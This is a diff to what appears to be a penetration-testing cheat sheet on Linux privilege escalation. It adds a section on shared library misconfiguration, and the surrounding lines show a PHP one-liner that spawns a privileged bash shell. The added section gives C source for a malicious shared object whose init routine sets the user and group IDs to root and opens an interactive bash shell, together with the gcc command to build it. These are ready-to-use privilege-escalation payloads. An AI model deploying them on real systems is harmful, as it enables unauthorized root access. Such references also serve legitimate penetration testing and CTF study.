@@ -3441,6 +3441,29 @@ export PATH=$(pwd):$PATH
 /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
 ```
 
+##### Shared Library Misconfiguration
+
+> https://tbhaxor.com/exploiting-shared-library-misconfigurations/
+
+###### shell.c
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -i");
+}
+```
+
+###### Compiling
+
+```c
+gcc -shared -fPIC -nostartfiles -o <FILE>.so <FILE>.c
+```
+
 ##### Wildcards
 
 > https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
